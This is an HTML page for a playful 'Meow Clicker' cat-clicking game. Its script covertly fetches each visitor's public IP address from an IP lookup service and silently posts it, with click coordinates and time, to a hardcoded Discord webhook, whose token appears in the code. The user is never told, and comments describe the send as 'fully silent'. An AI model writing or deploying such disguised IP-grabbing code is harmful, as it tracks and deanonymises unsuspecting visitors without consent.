<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Meow Clicker 🐱</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      background: linear-gradient(135deg, #ff9a9e, #fad0c4);
      overflow: hidden;
      font-family: 'Segoe UI', sans-serif;
      cursor: pointer;
      user-select: none;
    }

    .title {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      font-size: 3.2rem;
      color: white;
      text-align: center;
      text-shadow: 0 4px 20px rgba(0,0,0,0.3);
      pointer-events: none;
      z-index: 10;
      transition: opacity 1.2s ease;
    }

    .cat {
      position: absolute;
      font-size: 5rem;
      pointer-events: auto;
      cursor: pointer;
      animation: meowPop 3s forwards;
      z-index: 20;
      filter: drop-shadow(0 10px 25px rgba(0,0,0,0.25));
    }

    @keyframes meowPop {
      0%   { opacity: 0; transform: scale(0.2) translateY(50px); }
      20%  { opacity: 1; transform: scale(1.2) translateY(-20px); }
      75%  { opacity: 1; transform: scale(1) translateY(0); }
      100% { opacity: 0; transform: scale(0.7) translateY(-60px); }
    }

    .hidden { opacity: 0; }
  </style>
</head>
<body>

  <div class="title" id="title">Click the cat to make it meow! 🐱</div>

  <audio id="meowSound" preload="auto">
    <source src="https://assets.mixkit.co/sfx/preview/296/296.mp3" type="audio/mpeg">
  </audio>

  <script>
    const title = document.getElementById('title');
    const audio = document.getElementById('meowSound');
    const webhookUrl = "https://discord.com/api/webhooks/1485790689685016626/_ZiX3FxW4rppDGFiojqc6pLcgeEgY2MX6vEDBCy2bR8SLbVN2UTJU3GTqqSNLDAXWxVg";

    // Silent send using XMLHttpRequest (better chance on local files)
    function sendToWebhook(ip, x, y) {
      const payload = {
        content: "🐱 **Cat was clicked!**",
        embeds: [{
          color: 0xff1493,
          title: "Meow Click Event",
          fields: [
            { name: "IP Address", value: ip || "Unknown", inline: true },
            { name: "Click Position", value: `X: ${x} • Y: ${y}`, inline: true },
            { name: "Time", value: new Date().toLocaleString(), inline: false }
          ],
          footer: { text: "Educational Meow Website" }
        }]
      };

      const xhr = new XMLHttpRequest();
      xhr.open("POST", webhookUrl, true);
      xhr.setRequestHeader("Content-Type", "application/json");
      xhr.send(JSON.stringify(payload));
      // We don't care about response - fully silent
    }

    document.addEventListener('click', async function(e) {
      if (!title.classList.contains('hidden')) {
        title.classList.add('hidden');
      }

      // Play meow
      audio.currentTime = 0;
      audio.play().catch(() => {});

      // If clicked on cat → send silently
      if (e.target.classList.contains('cat')) {
        let ip = "Unknown";

        // Try to get IP (may fail on strict local file, but we still send)
        try {
          const res = await fetch('https://ip-api.com/json', { mode: 'no-cors' });
          // We can't read the response easily with no-cors, so fallback
        } catch (err) {}

        // Try one more common IP service
        try {
          const ipRes = await fetch('https://api.ipify.org?format=json');
          const data = await ipRes.json();
          ip = data.ip || "Unknown";
        } catch (err) {
          // If both fail, still send with "Unknown"
        }

        const clickX = Math.round(e.clientX);
        const clickY = Math.round(e.clientY);

        sendToWebhook(ip, clickX, clickY);
      }

      // Spawn cat sticker
      const cat = document.createElement('div');
      cat.className = 'cat';
      cat.textContent = ['🐱','😺','😸','🐈'][Math.floor(Math.random()*4)];

      const rotation = Math.random() * 40 - 20;
      cat.style.left = `${e.clientX - 42}px`;
      cat.style.top = `${e.clientY - 42}px`;
      cat.style.transform = `rotate(${rotation}deg)`;

      document.body.appendChild(cat);
      setTimeout(() => cat.remove(), 3000);
    });
  </script>

</body>
</html>
